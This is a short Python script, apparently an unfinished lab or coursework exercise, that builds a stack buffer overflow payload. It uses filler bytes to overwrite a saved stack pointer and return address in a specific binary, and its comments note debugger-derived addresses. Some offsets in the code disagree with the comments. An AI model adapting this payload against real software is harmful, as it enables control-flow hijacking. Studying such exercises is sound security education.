#!/usr/bin/env python3

import sys

#echobuf - 0x4ad7e0
#ptrs->fun addr when p &ptrs->fun = 0x4ad888
#overflow: echo buff to fun = 168
#ptrs - 0x4ad880
#ptrs->val - 0x4ad890
#b untouched = 0x4017a5
#rsp when i r command when echo_buff 0x7fffffffda08
#rsp and ret addr should point to the same address

oflow = b'A' * 162 #TODO

untouched = 0x4017a5 #TODO

rsp = 0x7fffffffdb08 #TODO

exploit = bytearray(oflow)
exploit.extend(rsp.to_bytes(8, byteorder='little'))
exploit.extend(untouched.to_bytes(8, byteorder='little'))
exploit.extend(b'\n')
sys.stdout.buffer.write(exploit)
